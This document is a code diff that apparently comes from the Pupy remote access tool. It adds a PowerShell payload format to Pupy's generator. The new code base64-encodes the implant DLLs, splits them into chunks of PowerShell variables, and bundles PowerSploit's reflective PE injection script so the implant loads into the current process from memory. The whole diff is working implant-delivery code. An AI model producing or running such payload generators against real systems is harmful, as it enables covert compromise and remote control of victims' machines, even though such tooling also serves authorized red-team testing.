@@ -14,6 +14,7 @@ from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
 import scriptlets
 import cPickle
+import base64
 
 
 def get_edit_pupyx86_dll(conf):
@@ -238,6 +239,7 @@ class ListOptions(argparse.Action):
         print "\t- py              : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
         print "\t- pyinst          : generate a python file compatible with pyinstaller"
         print "\t- py_oneliner     : same as \"py\" format but served over http to load it from memory with a single command line."
+        print "\t- ps1             : generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process."
         print "\t- ps1_oneliner    : load pupy remotely from memory with a single command line using powershell."
 
         print ""
@@ -255,7 +257,7 @@ class ListOptions(argparse.Action):
             print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])
         exit()
 
-PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'pyinst', 'py_oneliner', 'ps1_oneliner']
+PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner']
 if __name__=="__main__":
     if os.path.dirname(__file__):
         os.chdir(os.path.dirname(__file__))
@@ -346,6 +348,38 @@ if __name__=="__main__":
         i=conf["launcher_args"].index("--host")+1
         link_ip=conf["launcher_args"][i].split(":",1)[0]
         serve_payload(packed_payload, link_ip=link_ip)
+    elif args.format=="ps1":
+        SPLIT_SIZE = 100000
+        x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
+        if not outpath:
+            outpath="payload.ps1"
+        code = """
+        $PEBytes = ""
+        if ([IntPtr]::size -eq 4){{
+            {0}
+            $PEBytesTotal = [System.Convert]::FromBase64String({1})
+        }}
+        else{{
+            {2}
+            $PEBytesTotal = [System.Convert]::FromBase64String({3})
+        }}
+        Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
+        """#{1}=x86dll, {3}=x64dll 
+        binaryX64=base64.b64encode(get_edit_pupyx64_dll(conf))
+        binaryX86=base64.b64encode(get_edit_pupyx86_dll(conf))
+        binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
+        binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
+        for i,aPart in enumerate(binaryX86parts):
+            x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
+            x86ConcatCode += "$PEBytes{0}+".format(i)
+        print(colorize("[+] ","green")+"X86 dll loaded and {0} variables used".format(i+1))
+        for i,aPart in enumerate(binaryX64parts):
+            x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
+            x64ConcatCode += "$PEBytes{0}+".format(i)
+        print(colorize("[+] ","green")+"X64 dll loaded and {0} variables used".format(i+1))
+        script = open(os.path.join("external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
+        with open(outpath, 'wb') as w:
+            w.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]) ))
     elif args.format=="ps1_oneliner":
         from pupylib.payloads.ps1_oneliner import serve_ps1_payload
         i=conf["launcher_args"].index("--host")+1
